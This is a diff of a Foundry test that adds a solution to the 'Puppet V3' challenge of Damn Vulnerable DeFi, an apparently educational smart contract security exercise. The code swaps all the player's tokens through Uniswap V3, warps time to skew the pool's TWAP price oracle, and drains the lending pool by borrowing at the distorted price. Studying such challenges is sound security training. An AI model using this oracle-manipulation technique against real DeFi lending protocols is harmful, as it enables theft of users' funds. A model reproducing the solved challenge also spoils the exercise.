@@ -5,11 +5,13 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +121,42 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        vm.stopPrank();
+        vm.startPrank(player);
+        console.log(player.balance, 'eth balance');
+        console.log(token.balanceOf(player), 'token balance');
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        weth.deposit{value: player.balance}();
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        console.log(lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool))), 'calculateDepositOfWETHRequired');
+
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                FEE,
+                player,
+                block.timestamp + 1000,
+                token.balanceOf(player), // 110 DVT TOKENS
+                0,
+                0
+            )
+        );
+        vm.warp(block.timestamp + 100);
+
+        console.log(lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool))), 'calculateDepositOfWETHRequired');
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+
+        console.log(token.balanceOf(recovery), 'recovery balance');
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log(token.balanceOf(recovery), 'recovery balance after');
     }
 
     /**
